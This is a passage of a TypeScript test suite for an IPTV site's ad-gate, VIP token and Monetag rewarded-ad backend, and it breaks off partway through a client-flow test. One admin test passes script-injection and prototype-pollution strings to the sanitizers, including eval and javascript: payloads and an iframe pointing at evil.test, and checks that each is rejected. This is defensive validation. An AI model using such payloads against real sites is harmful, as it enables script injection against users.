import os from 'node:os';
import fs from 'node:fs';
import path from 'node:path';
import vm from 'node:vm';
import http from 'node:http';
import { webcrypto } from 'node:crypto';
import test from 'node:test';
import assert from 'node:assert/strict';
import express from 'express';

// Configure isolated temporary DB & secrets before importing backend modules
const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'mrs-adgate-test-'));
process.env.DB_PATH = path.join(tmpDir, 'test.sqlite');
process.env.UPLOAD_DIR = path.join(tmpDir, 'uploads');
process.env.ADMIN_TOKEN = 'test-admin-secret-123';
process.env.SIGNING_SECRET = 'test-signing-secret-xyz';
process.env.TOKEN_SECRET = 'test-token-secret-xyz';
process.env.REWARD_MIN_WATCH_MS = '15000';
process.env.REWARD_COOLDOWN_MINUTES = '180';
process.env.REWARD_MAX_PER_DEVICE_PER_DAY = '3';
process.env.REWARD_MAX_PER_IP_PER_DAY = '6';
process.env.MONETAG_POSTBACK_SECRET = 'monetag-postback-test-secret';

const { db, run, get, nowIso } = await import('../server/mrs-iptv-backend/src/db.js');
const { redeem, signToken, verifyToken, sanitizeDeviceId, checkEntitlement } = await import('../server/mrs-iptv-backend/src/redeem.js');
const { createAdsRouter, MONETAG_ZONES, sanitizeShowFn, sanitizeRewardedSnippet } = await import('../server/adsRouter.js');
const {
  MONETAG_CANONICAL_ZONES,
  MONETAG_DEFAULT_VERIFICATION_ID,
  MONETAG_DEFAULT_INTERSTITIAL_ZONE_ID,
  isValidShowFnIdentifier,
  isSafeMonetagZoneUrl,
} = await import('../src/lib/monetagConfig.js');
const paymentRouterModule = await import('../server/paymentRouter.js');
const createPaymentRouter = paymentRouterModule.default || paymentRouterModule.createPaymentRouter;

const adGateSource = fs.readFileSync(path.join(process.cwd(), 'public', 'ad-gate.js'), 'utf8');
const adManagerSource = fs.readFileSync(path.join(process.cwd(), 'public', 'ad-manager.js'), 'utf8');
const rewardAdsSource = fs.readFileSync(path.join(process.cwd(), 'public', 'rewardAds.js'), 'utf8');

function createDomSandbox(options: {
  initialStorage?: Record<string, string>;
  fetchImpl?: (url: string, init?: any) => Promise<any>;
  serviceWorkers?: Array<{ scriptURL: string; hasPush: boolean }>;
} = {}) {
  const storageMap = new Map<string, string>(Object.entries(options.initialStorage || {}));
  const unregisteredUrls: string[] = [];
  let pushUnsubscribed = 0;

  const domAttrs = new Map<string, string>();
  const removedSelectors: string[] = [];
  const adElements: any[] = [
    { parentNode: { removeChild: () => removedSelectors.push('.ad-slot') } },
  ];

  const doc: any = {
    cookie: '',
    head: { appendChild: (el: any) => el },
    documentElement: {
      setAttribute: (k: string, v: string) => domAttrs.set(k, String(v)),
      getAttribute: (k: string) => domAttrs.get(k) || null,
      appendChild: (el: any) => el,
    },
    getElementById: () => null,
    createElement: (tag: string) => ({
      tagName: tag.toUpperCase(),
      attributes: {} as Record<string, string>,
      setAttribute(k: string, v: string) { this.attributes[k] = String(v); },
      getAttribute(k: string) { return this.attributes[k] || null; },
      appendChild: () => {},
    }),
    createTextNode: (t: string) => ({ textContent: t }),
    querySelectorAll: (sel: string) => (sel.includes('.ad-slot') ? adElements.slice() : []),
  };

  const scheduledDelays: number[] = [];
  let timerSeq = 1;
  let reloadCalled = 0;

  const sandbox: any = {
    console,
    Date,
    Math,
    JSON,
    Promise,
    AbortController,
    encodeURIComponent,
    location: {
      reload: () => {
        reloadCalled += 1;
      },
    },
    setTimeout: (_fn: any, ms: number) => {
      scheduledDelays.push(Number(ms || 0));
      return timerSeq++;
    },
    clearTimeout: () => {},
    setInterval: () => timerSeq++,
    clearInterval: () => {},
    CustomEvent: class CustomEvent {
      type: string;
      detail: any;
      constructor(type: string, opts?: any) {
        this.type = type;
        this.detail = opts?.detail;
      }
    },
    Element: { prototype: { appendChild: (child: any) => child } },
    document: doc,
    navigator: {
      serviceWorker: {
        getRegistrations: async () =>
          (options.serviceWorkers || []).map((sw) => ({
            active: { scriptURL: sw.scriptURL },
            pushManager: sw.hasPush
              ? {
                  getSubscription: async () => ({
                    unsubscribe: async () => {
                      pushUnsubscribed += 1;
                      return true;
                    },
                  }),
                }
              : null,
            unregister: async () => {
              unregisteredUrls.push(sw.scriptURL);
              return true;
            },
          })),
      },
    },
    localStorage: {
      get length() {
        return storageMap.size;
      },
      key(i: number) {
        return Array.from(storageMap.keys())[i] ?? null;
      },
      getItem(k: string) {
        return storageMap.has(k) ? storageMap.get(k)! : null;
      },
      setItem(k: string, v: string) {
        storageMap.set(String(k), String(v));
      },
      removeItem(k: string) {
        storageMap.delete(String(k));
      },
    },
    fetch: options.fetchImpl || (async () => ({ ok: false, status: 500, json: async () => ({}) })),
    open: () => ({ opened: true }),
    addEventListener: () => {},
    dispatchEvent: () => true,
  };
  sandbox.window = sandbox;

  vm.runInNewContext(adGateSource, sandbox, { filename: 'ad-gate.js' });

  return {
    window: sandbox,
    storage: storageMap,
    domAttrs,
    removedSelectors,
    unregisteredUrls,
    getPushUnsubscribed: () => pushUnsubscribed,
    getReloadCalled: () => reloadCalled,
  };
}

let server: http.Server;
let baseUrl: string;
let activeVipToken = '';
const TEST_DEVICE = 'test-device-adgate-0001';

test.before(async () => {
  // Seed an issued VIP pass code and redeem it to get a real signed VIP token
  const code = 'MRS-1M-ADGT-TEST-2345';
  run(
    `INSERT INTO codes (code, plan, status, issued_at, created_at) VALUES (?, '1m', 'issued', ?, ?)`,
    code,
    nowIso(),
    nowIso()
  );
  const res = redeem({ code, deviceId: TEST_DEVICE });
  assert.equal(res.ok, true, `test VIP code redemption should succeed: ${JSON.stringify(res)}`);
  activeVipToken = (res as any).token;

  const app = express();
  app.use(express.json());
  app.use(createAdsRouter());
  if (typeof createPaymentRouter === 'function') {
    app.use('/api', createPaymentRouter());
  }

  server = http.createServer(app);
  await new Promise<void>((resolve) => {
    server.listen(0, '127.0.0.1', () => resolve());
  });
  const addr = server.address() as any;
  baseUrl = `http://127.0.0.1:${addr.port}`;
});

test.after(async () => {
  if (server) {
    try { (server as any).closeAllConnections?.(); } catch {}
    await new Promise<void>((resolve) => server.close(() => resolve()));
  }
  try { db.close(); } catch {}
  try { fs.rmSync(tmpDir, { recursive: true, force: true }); } catch {}
});

test('1. Fresh visitor with no token immediately resolves MRS_AD_STATE === "free"', () => {
  let fetchCalled = false;
  const env = createDomSandbox({
    fetchImpl: async () => {
      fetchCalled = true;
      return { ok: true, status: 200, json: async () => ({ active: false }) };
    },
  });
  assert.equal(env.window.MRS_ADS.state(), 'free');
  assert.equal(env.domAttrs.get('data-mrs-ad-state'), 'free');
  assert.equal(fetchCalled, false);
});

test('2. Visitor with valid VIP token resolves to "vip" via /api/status and persists mrs_vip_ads_hint', async () => {
  const futureExp = new Date(Date.now() + 86400_000 * 30).toISOString();
  const env = createDomSandbox({
    initialStorage: {
      mrs_vip_entitlement: JSON.stringify({ token: 'vip-tok-1', plan: '1m', expiresAt: futureExp }),
      mrs_device_id: 'dev-123456789012',
    },
    fetchImpl: async (url) => {
      assert.ok(url.includes('/api/status'));
      return {
        ok: true,
        status: 200,
        json: async () => ({ ok: true, data: { active: true, plan: '1m', expiresAt: futureExp } }),
      };
    },
  });

  // Immediately starts pending before async resolve
  assert.equal(['pending', 'vip'].includes(env.window.MRS_ADS.state()), true);
  await env.window.MRS_ADS.refresh();
  assert.equal(env.window.MRS_ADS.state(), 'vip');
  assert.equal(env.domAttrs.get('data-mrs-ad-state'), 'vip');
  assert.ok(env.storage.get('mrs_vip_ads_hint')?.includes(futureExp));
  // Calling window.open to an ad URL must be blocked while VIP
  assert.equal(env.window.open('https://uplcm.com/4/11226634', '_blank'), null);
});

test('3. VIP token present but /api/status fails FAILS CLOSED (never shows ads)', async () => {
  const futureExp = new Date(Date.now() + 86400_000 * 5).toISOString();
  // Case A: network fails, future hint exists -> 'vip' (no ads)
  const withHint = createDomSandbox({
    initialStorage: {
      mrs_vip_entitlement: JSON.stringify({ token: 'vip-tok-offline' }),
      mrs_vip_ads_hint: JSON.stringify({ expiresAt: futureExp }),
    },
    fetchImpl: async () => {
      throw new Error('Network down');
    },
  });
  await withHint.window.MRS_ADS.refresh();
  assert.equal(withHint.window.MRS_ADS.state(), 'vip');

  // Case B: network fails, NO hint exists -> 'pending' (fail closed, NO ads)
  const withoutHint = createDomSandbox({
    initialStorage: {
      mrs_vip_entitlement: JSON.stringify({ token: 'vip-tok-nohint' }),
    },
    fetchImpl: async () => {
      throw new Error('Timeout');
    },
  });
  await withoutHint.window.MRS_ADS.refresh();
  assert.equal(withoutHint.window.MRS_ADS.state(), 'pending');
  assert.notEqual(withoutHint.window.MRS_ADS.state(), 'free');
});

test('4. Expired VIP clears stale token, switches to "free", and flags single expiry notice', async () => {
  const env = createDomSandbox({
    initialStorage: {
      mrs_vip_entitlement: JSON.stringify({ token: 'expired-tok' }),
      mrs_vip_ads_hint: JSON.stringify({ expiresAt: new Date(Date.now() - 3600_000).toISOString() }),
    },
    fetchImpl: async () => ({
      ok: false,
      status: 401,
      json: async () => ({ ok: false, data: { active: false }, active: false }),
    }),
  });

  await env.window.MRS_ADS.refresh();
  assert.equal(env.window.MRS_ADS.state(), 'free');
  assert.equal(env.storage.has('mrs_vip_entitlement'), false);
  assert.equal(env.storage.has('mrs_vip_ads_hint'), false);
  assert.equal(env.storage.get('mrs_ads_expired_notice'), '1');
});

test('5. enterVipMode() purges ad DOM, clears mrs_ads_* & interstitial keys, unregisters ad SWs, unsubscribes Web Push', async () => {
  const futureExp = new Date(Date.now() + 86400_000 * 30).toISOString();
  const env = createDomSandbox({
    initialStorage: {
      mrs_ads_pop_timestamps: '[12345]',
      mrs_ads_consent_v1: '{"accepted":true}',
      mrs_ad_pop_last: '12345',
      mrs_last_interstitial_shown_at: String(Date.now()),
      mrs_interstitial_daily_hist: '{"day":"2026-11-28","count":2}',
    },
    serviceWorkers: [
      { scriptURL: 'https://example.com/sw.js', hasPush: false },
      { scriptURL: 'https://example.com/monetag-push-sw.js', hasPush: true },
    ],
  });

  assert.equal(env.window.MRS_ADS.state(), 'free');
  await env.window.MRS_ADS.enterVipMode(futureExp);

  assert.equal(env.window.MRS_ADS.state(), 'vip');
  assert.equal(env.storage.has('mrs_ads_pop_timestamps'), false);
  assert.equal(env.storage.has('mrs_ads_consent_v1'), false);
  assert.equal(env.storage.has('mrs_ad_pop_last'), false);
  assert.equal(env.storage.has('mrs_last_interstitial_shown_at'), false);
  assert.equal(env.storage.has('mrs_interstitial_daily_hist'), false);
  assert.ok(env.removedSelectors.includes('.ad-slot'));
  assert.deepEqual(env.unregisteredUrls, ['https://example.com/monetag-push-sw.js']);
  assert.equal(env.getPushUnsubscribed(), 1);
  assert.equal(env.getReloadCalled(), 1);
});

test('6. /go/:offerId is completely unmounted (404), MONETAG_ZONES preserves all 10 uplcm.com URLs, and /api/ads/config is Monetag-only', async () => {
  assert.equal(MONETAG_ZONES.length, 10);
  const monetagZone = MONETAG_ZONES.find((z) => z.zoneId === '11226634');
  assert.ok(monetagZone);
  assert.equal(monetagZone.url, 'https://uplcm.com/4/11226634');

  const removedGoRes = await fetch(`${baseUrl}/go/11226634`, { redirect: 'manual' });
  assert.equal(removedGoRes.status, 404);

  const cfgRes = await fetch(`${baseUrl}/api/ads/config`);
  assert.equal(cfgRes.status, 200);
  const cfgJson = await cfgRes.json() as any;
  assert.equal(cfgJson.ok, true);
  assert.equal(cfgJson.data.hideOffersForVip, undefined);
  assert.equal(cfgJson.data.offers, undefined);
  assert.equal(cfgJson.data.formats.affiliate, undefined);
  assert.equal(cfgJson.data.monetag.verificationId, 'fa9656182dbc7301dcd9a2326441dcf3');
  assert.equal(cfgJson.data.monetag.caps.popunderCooldownMs, 30 * 60_000);
  assert.equal(cfgJson.data.monetag.caps.popunderMaxPerDay, 3);
  assert.equal(cfgJson.data.monetag.caps.pushDelayMs, 60_000);
  assert.equal(cfgJson.data.monetag.caps.pushMinVisits, 2);
  assert.equal(cfgJson.data.monetag.caps.pushDeclineDays, 30);
  assert.equal(cfgJson.data.monetag.caps.emptySlotCollapseMs, 4000);
  assert.equal(cfgJson.data.monetag.rewardedEnabled, false);
  assert.equal(cfgJson.data.rewards.anyRewardedAvailable, false);
});

test('7. POST /api/ads/event records free events and ignores active VIP Bearer requests', async () => {
  // VIP request -> zero recorded events
  const vipEvRes = await fetch(`${baseUrl}/api/ads/event`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      Authorization: `Bearer ${activeVipToken}`,
      'x-device-id': TEST_DEVICE,
    },
    body: JSON.stringify({
      events: [{ eventType: 'view', format: 'banner', placement: 'home-top', offerId: '11226634' }],
    }),
  });
  const vipEvJson = await vipEvRes.json() as any;
  assert.equal(vipEvJson.ok, true);
  assert.equal(vipEvJson.data.accepted, 0);
  assert.equal(vipEvJson.data.ignored, 'vip');

  // Free request -> recorded
  const freeEvRes = await fetch(`${baseUrl}/api/ads/event`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      events: [{ eventType: 'view', format: 'banner', placement: 'home-top', offerId: '11226634' }],
    }),
  });
  const freeEvJson = await freeEvRes.json() as any;
  assert.equal(freeEvJson.ok, true);
  assert.equal(freeEvJson.data.accepted, 1);
});

test('8. Admin ads report & config routes enforce x-admin-token and persist Monetag-only toggles', async () => {
  const unauthRes = await fetch(`${baseUrl}/api/admin/ads/report`);
  assert.equal(unauthRes.status, 401);

  // Record a free-user click event directly via /api/ads/event
  const clickEvRes = await fetch(`${baseUrl}/api/ads/event`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      events: [{ eventType: 'click', format: 'banner', placement: 'home-top', zoneId: '11226634' }],
    }),
  });
  assert.equal(clickEvRes.status, 200);

  const putRes = await fetch(`${baseUrl}/api/admin/ads/config`, {
    method: 'PUT',
    headers: {
      'Content-Type': 'application/json',
      'x-admin-token': 'test-admin-secret-123',
    },
    body: JSON.stringify({
      formats: { popunder: false, banner: true },
      testMode: true,
    }),
  });
  assert.equal(putRes.status, 200);
  const putJson = await putRes.json() as any;
  assert.equal(putJson.ok, true);
  assert.equal(putJson.data.formats.popunder, false);
  assert.equal(putJson.data.formats.affiliate, undefined);
  assert.equal(putJson.data.hideOffersForVip, undefined);
  assert.equal(putJson.data.testMode, true);

  const reportRes = await fetch(`${baseUrl}/api/admin/ads/report?days=30`, {
    headers: { 'x-admin-token': 'test-admin-secret-123' },
  });
  assert.equal(reportRes.status, 200);
  const reportJson = await reportRes.json() as any;
  assert.equal(reportJson.ok, true);
  assert.ok(reportJson.data.totals.views >= 1);
  assert.ok(reportJson.data.totals.clicks >= 1);
  assert.ok(Array.isArray(reportJson.data.byZone) && reportJson.data.byZone.length >= 1);
});

test('9. GET /api/status returns { ok, data: { active, plan: "vip", planCode, expiresAt } } for paid VIP and { active: false } for free/invalid', async () => {
  const vipRes = await fetch(`${baseUrl}/api/status?deviceId=${encodeURIComponent(TEST_DEVICE)}`, {
    headers: { Authorization: `Bearer ${activeVipToken}` },
  });
  assert.equal(vipRes.status, 200);
  const vipJson = await vipRes.json() as any;
  assert.equal(vipJson.ok, true);
  assert.equal(vipJson.data.active, true);
  assert.equal(vipJson.data.plan, 'vip');
  assert.equal(vipJson.data.planCode, '1m');
  assert.ok(typeof vipJson.data.expiresAt === 'string' && vipJson.data.expiresAt.length > 0);

  const anonRes = await fetch(`${baseUrl}/api/status`);
  assert.equal(anonRes.status, 401);
  const anonJson = await anonRes.json() as any;
  assert.equal(anonJson.ok, false);
  assert.equal(anonJson.data.active, false);
});

test('10. Reward start -> early claim rejected -> valid claim grants reward1h -> nonce reuse blocked -> /api/status active', async () => {
  const rewardDev = 'reward-dev-flow-0001';

  // Paid VIP cannot start a reward session
  const vipStartRes = await fetch(`${baseUrl}/api/rewards/start`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      Authorization: `Bearer ${activeVipToken}`,
      'x-device-id': TEST_DEVICE,
    },
    body: JSON.stringify({ deviceId: TEST_DEVICE, network: 'monetag' }),
  });
  assert.equal(vipStartRes.status, 409);

  // Unsupported reward networks (including removed Adsterra) stay rejected
  const unsupportedStartRes = await fetch(`${baseUrl}/api/rewards/start`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ deviceId: rewardDev, network: 'adsterra' }),
  });
  assert.equal(unsupportedStartRes.status, 400);

  // Free user starts reward session
  const startRes = await fetch(`${baseUrl}/api/rewards/start`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ deviceId: rewardDev, network: 'monetag' }),
  });
  assert.equal(startRes.status, 200);
  const startJson = await startRes.json() as any;
  assert.equal(startJson.ok, true);
  assert.ok(typeof startJson.data.nonce === 'string' && startJson.data.nonce.length >= 32);
  assert.equal(startJson.data.minWatchMs, 15000);

  // Claiming before minWatchMs elapses is rejected
  const earlyClaimRes = await fetch(`${baseUrl}/api/rewards/claim`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ nonce: startJson.data.nonce, deviceId: rewardDev }),
  });
  assert.equal(earlyClaimRes.status, 400);
  const earlyClaimJson = await earlyClaimRes.json() as any;
  assert.equal(earlyClaimJson.error.code, 'too_early');

  // Backdate session created_at beyond minWatchMs
  const backdated = new Date(Date.now() - 20_000).toISOString();
  run(`UPDATE reward_sessions SET created_at = ? WHERE nonce = ?`, backdated, startJson.data.nonce);

  const claimRes = await fetch(`${baseUrl}/api/rewards/claim`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ nonce: startJson.data.nonce, deviceId: rewardDev }),
  });
  assert.equal(claimRes.status, 200);
  const claimJson = await claimRes.json() as any;
  assert.equal(claimJson.ok, true);
  assert.equal(claimJson.data.plan, 'reward1h');
  assert.ok(typeof claimJson.data.token === 'string' && claimJson.data.token.length > 20);

  // Nonce reuse fails cleanly
  const reuseRes = await fetch(`${baseUrl}/api/rewards/claim`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ nonce: startJson.data.nonce, deviceId: rewardDev }),
  });
  assert.equal(reuseRes.status, 409);

  // Stacking another reward while active fails
  const stackStartRes = await fetch(`${baseUrl}/api/rewards/start`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ deviceId: rewardDev, network: 'monetag' }),
  });
  assert.equal(stackStartRes.status, 409);

  // /api/status treats reward1h token as active VIP
  const statusRes = await fetch(`${baseUrl}/api/status?deviceId=${encodeURIComponent(rewardDev)}`, {
    headers: { Authorization: `Bearer ${claimJson.data.token}` },
  });
  assert.equal(statusRes.status, 200);
  const statusJson = await statusRes.json() as any;
  assert.equal(statusJson.ok, true);
  assert.equal(statusJson.data.active, true);
  assert.equal(statusJson.data.plan, 'reward1h');
  assert.equal(statusJson.data.planCode, 'reward1h');

  // Reward user ad events are ignored just like paid VIP
  const evRes = await fetch(`${baseUrl}/api/ads/event`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      Authorization: `Bearer ${claimJson.data.token}`,
      'x-device-id': rewardDev,
    },
    body: JSON.stringify({ events: [{ eventType: 'view', format: 'banner', placement: 'home-top', offerId: '11226634' }] }),
  });
  const evJson = await evRes.json() as any;
  assert.equal(evJson.data.accepted, 0);
  assert.equal(evJson.data.ignored, 'vip');
});

test('11. Post-expiry cooldown & daily per-device cap enforce server limits', async () => {
  const capDev = 'reward-dev-cap-0002';
  const { hashDevice } = await import('../server/mrs-iptv-backend/src/redeem.js');
  const devHash = hashDevice(capDev);

  // Insert an expired grant from 10 minutes ago -> still inside 180-min cooldown
  const tenMinAgo = new Date(Date.now() - 10 * 60_000).toISOString();
  const seventyMinAgo = new Date(Date.now() - 70 * 60_000).toISOString();
  run(
    `INSERT INTO reward_grants(device_hash, ip_hash, network, granted_at, expires_at) VALUES (?, 'iphash1', 'monetag', ?, ?)`,
    devHash,
    seventyMinAgo,
    tenMinAgo
  );

  const cooldownRes = await fetch(`${baseUrl}/api/rewards/start`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ deviceId: capDev, network: 'monetag' }),
  });
  assert.equal(cooldownRes.status, 429);
  const cooldownJson = await cooldownRes.json() as any;
  assert.equal(cooldownJson.error.code, 'reward_cooldown');
  assert.ok(cooldownJson.error.retryAfterMinutes >= 1);

  // Move latest grant expiry past 180m cooldown, and add 2 more today -> hits 3/day device cap
  const fourHoursAgo = new Date(Date.now() - 4 * 3600_000).toISOString();
  const fiveHoursAgo = new Date(Date.now() - 5 * 3600_000).toISOString();
  run(`UPDATE reward_grants SET granted_at = ?, expires_at = ? WHERE device_hash = ?`, fiveHoursAgo, fourHoursAgo, devHash);
  run(
    `INSERT INTO reward_grants(device_hash, ip_hash, network, granted_at, expires_at) VALUES (?, 'iphash1', 'monetag', ?, ?), (?, 'iphash1', 'monetag', ?, ?)`,
    devHash, fiveHoursAgo, fourHoursAgo,
    devHash, fiveHoursAgo, fourHoursAgo
  );

  const capRes = await fetch(`${baseUrl}/api/rewards/start`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ deviceId: capDev, network: 'monetag' }),
  });
  assert.equal(capRes.status, 429);
  const capJson = await capRes.json() as any;
  assert.equal(capJson.error.code, 'device_daily_cap');
});

test('12. Admin reward report, revoke, Monetag toggle, and removal verification', async () => {
  // Rejects removed non-Monetag network toggles
  const refuseRes = await fetch(`${baseUrl}/admin/rewards/toggle`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'x-admin-token': 'test-admin-secret-123',
    },
    body: JSON.stringify({ network: 'adsterra', enabled: true }),
  });
  assert.equal(refuseRes.status, 400);
  const refuseJson = await refuseRes.json() as any;
  assert.equal(refuseJson.error.code, 'invalid_network');

  // Allows toggling Monetag settings cleanly, validates showFn identifier robustly, and resets back to false/null
  const invalidCandidates: unknown[] = [
    'eval("alert(1)")',
    'Eval',
    '__proto__.constructor',
    'constructor.constructor',
    'window.eval',
    'window.Location',
    'Function',
    'function',
    'class',
    'Object.assign',
    'Proxy',
    'Reflect.get',
    'arguments',
    'this',
    'foo..bar',
    'foo.',
    'a.0bar',
    'a.b.c.d.e',
    'alert',
    { bad: true },
  ];
  for (const candidate of invalidCandidates) {
    assert.throws(() => sanitizeShowFn(candidate), /Rewarded callback name/i);
    const badFnRes = await fetch(`${baseUrl}/admin/rewards/toggle`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-admin-token': 'test-admin-secret-123',
      },
      body: JSON.stringify({ network: 'monetag', showFn: candidate }),
    });
    assert.equal(badFnRes.status, 400);
    const badFnJson = await badFnRes.json() as any;
    assert.equal(badFnJson.error.code, 'invalid_show_fn');
  }
  assert.equal(sanitizeShowFn('MonetagSDK.reward.show'), 'MonetagSDK.reward.show');

  // Snippet injection rejection
  assert.throws(() => sanitizeRewardedSnippet('<iframe src="https://evil.test"></iframe>'), /disallowed inline/i);
  assert.throws(() => sanitizeRewardedSnippet('javascript:alert(1)'), /disallowed inline/i);
  const badSnippetRes = await fetch(`${baseUrl}/api/admin/ads/config`, {
    method: 'PUT',
    headers: {
      'Content-Type': 'application/json',
      'x-admin-token': 'test-admin-secret-123',
    },
    body: JSON.stringify({
      monetag: { showRegularAds: false, rewarded: { enabled: true, snippet: 'eval("bad")' } },
    }),
  });
  assert.equal(badSnippetRes.status, 400);
  const badSnippetJson = await badSnippetRes.json() as any;
  assert.equal(badSnippetJson.error.code, 'invalid_snippet');

  const allowRes = await fetch(`${baseUrl}/admin/rewards/toggle`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'x-admin-token': 'test-admin-secret-123',
    },
    body: JSON.stringify({ network: 'monetag', enabled: true, showFn: 'show_11226634' }),
  });
  assert.equal(allowRes.status, 200);
  const allowJson = await allowRes.json() as any;
  assert.equal(allowJson.data.monetag.rewarded.enabled, true);
  assert.equal(allowJson.data.monetag.rewarded.showFn, 'show_11226634');

  const enabledCfgRes = await fetch(`${baseUrl}/api/ads/config`);
  assert.equal(enabledCfgRes.status, 200);
  const enabledCfgJson = await enabledCfgRes.json() as any;
  assert.equal(enabledCfgJson.data.monetag.rewardedEnabled, true);
  assert.equal(enabledCfgJson.data.monetag.rewardedShowFn, 'show_11226634');
  assert.equal(enabledCfgJson.data.rewards.anyRewardedAvailable, true);

  await fetch(`${baseUrl}/admin/rewards/toggle`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'x-admin-token': 'test-admin-secret-123' },
    body: JSON.stringify({ network: 'monetag', enabled: false, showFn: null }),
  });

  // Static files confirm complete removal of Adsterra/Admitad/Mitgo/offers.json/subid/affiliate while preserving Monetag
  const indexHtml = fs.readFileSync(path.join(process.cwd(), 'index.html'), 'utf8');
  assert.equal(indexHtml.includes('mitgo-verification'), false);
  assert.ok(indexHtml.includes('name="monetag"'));
  assert.equal(fs.existsSync(path.join(process.cwd(), 'data', 'offers.json')), false);
  assert.equal(fs.existsSync(path.join(process.cwd(), 'src', 'components', 'AdvertisementCategoryView.tsx')), false);

  const adsConfigSource = fs.readFileSync(path.join(process.cwd(), 'public', 'ads.config.js'), 'utf8');
  assert.ok(adsConfigSource.includes('https://uplcm.com/4/11226634'));

  const auditedFiles = [
    'index.html',
    'public/ad-gate.js',
    'public/ads.config.js',
    'public/ad-manager.js',
    'public/rewardAds.js',
    'server/adsRouter.ts',
    'src/lib/useAdGate.ts',
    'src/lib/adSystem.ts',
    'src/components/AdBannerUnit.tsx',
    'src/components/LegalPolicyModal.tsx',
  ];
  const forbiddenPattern = /adsterra|admitad|mitgo|rzekl|subid|\/go\/|offers_clicks|offers\.json|affiliate/i;
  for (const rel of auditedFiles) {
    const content = fs.readFileSync(path.join(process.cwd(), rel), 'utf8');
    assert.equal(forbiddenPattern.test(content), false, `Forbidden reference found in ${rel}`);
  }

  // Report returns aggregated counts (both top-level and nested totals)
  const repRes = await fetch(`${baseUrl}/admin/rewards/report?days=30`, {
    headers: { 'x-admin-token': 'test-admin-secret-123' },
  });
  assert.equal(repRes.status, 200);
  const repJson = await repRes.json() as any;
  assert.equal(repJson.ok, true);
  assert.ok(repJson.data.starts >= 1);
  assert.ok(repJson.data.claims >= 1);
  assert.equal(repJson.data.totals.starts, repJson.data.starts);
  assert.equal(repJson.data.totals.claims, repJson.data.claims);
  assert.ok(Array.isArray(repJson.data.grantsPerDay));
  if (repJson.data.grantsPerDay.length > 0) {
    assert.equal(repJson.data.grantsPerDay[0].network, 'monetag');
  }
  assert.ok(Array.isArray(repJson.data.suspiciousDevices));
  if (repJson.data.suspiciousDevices.length > 0) {
    assert.ok(typeof repJson.data.suspiciousDevices[0].grants === 'number');
  }

  // GET /api/rewards/status returns cooldown, quota, and paid VIP state
  const badStatusRes = await fetch(`${baseUrl}/api/rewards/status?deviceId=bad`);
  assert.equal(badStatusRes.status, 400);

  const freeStatusRes = await fetch(`${baseUrl}/api/rewards/status?deviceId=${encodeURIComponent('reward-dev-cap-0002')}`);
  assert.equal(freeStatusRes.status, 200);
  const freeStatusJson = await freeStatusRes.json() as any;
  assert.equal(freeStatusJson.ok, true);
  assert.equal(freeStatusJson.data.remainingToday, 0);
  assert.equal(freeStatusJson.data.unlocksVipChannels, true);

  const vipStatusRes = await fetch(`${baseUrl}/api/rewards/status?deviceId=${encodeURIComponent(TEST_DEVICE)}`, {
    headers: { Authorization: `Bearer ${activeVipToken}` },
  });
  assert.equal(vipStatusRes.status, 200);
  const vipStatusJson = await vipStatusRes.json() as any;
  assert.equal(vipStatusJson.data.activeVip, true);
  assert.equal(vipStatusJson.data.eligible, false);
  assert.equal(vipStatusJson.data.reason, 'vip_active');

  // Revoking reward-dev-flow-0001 invalidates active reward grant
  const { hashDevice } = await import('../server/mrs-iptv-backend/src/redeem.js');
  const revHash = hashDevice('reward-dev-flow-0001');
  const revokeRes = await fetch(`${baseUrl}/admin/rewards/revoke`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'x-admin-token': 'test-admin-secret-123',
    },
    body: JSON.stringify({ deviceHash: revHash }),
  });
  assert.equal(revokeRes.status, 200);
  const revokeJson = await revokeRes.json() as any;
  assert.ok(revokeJson.data.revokedGrants >= 1);
});

test('13. POST /api/rewards/postback verifies shared secret & marks session verified', async () => {
  const pbDev = 'reward-dev-postback-03';
  const startRes = await fetch(`${baseUrl}/api/rewards/start`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ deviceId: pbDev, network: 'monetag' }),
  });
  const startJson = await startRes.json() as any;
  assert.equal(startJson.ok, true);

  const badPb = await fetch(`${baseUrl}/api/rewards/postback`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'x-postback-secret': 'wrong-secret' },
    body: JSON.stringify({ nonce: startJson.data.nonce, network: 'monetag' }),
  });
  assert.equal(badPb.status, 401);

  const okPb = await fetch(`${baseUrl}/api/rewards/postback`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'x-postback-secret': 'monetag-postback-test-secret' },
    body: JSON.stringify({ nonce: startJson.data.nonce, network: 'monetag' }),
  });
  assert.equal(okPb.status, 200);
  const row = get(`SELECT status FROM reward_sessions WHERE nonce = ?`, startJson.data.nonce) as any;
  assert.equal(row?.status, 'verified');
});

test('14. rewardAds.js client flow: early cancel grants nothing; completion calls enterVipMode()', async () => {
  const createdEls: Record<string, any> = {};
  let claimCalls = 0;
  let intervalCb: any = null;
  let enterVipCalls = 0;
  const storageMap = new Map<string, string>([['mrs_device_id', 'sandbox-reward-dev-123']]);

  const makeEl = (tag: string, id = '') => {
    const el: any = {
      tagName: tag.toUpperCase(),
      id,
      style: {},
      textContent: '',
      _innerHTML: '',
      parentNode: { removeChild: () => {} },
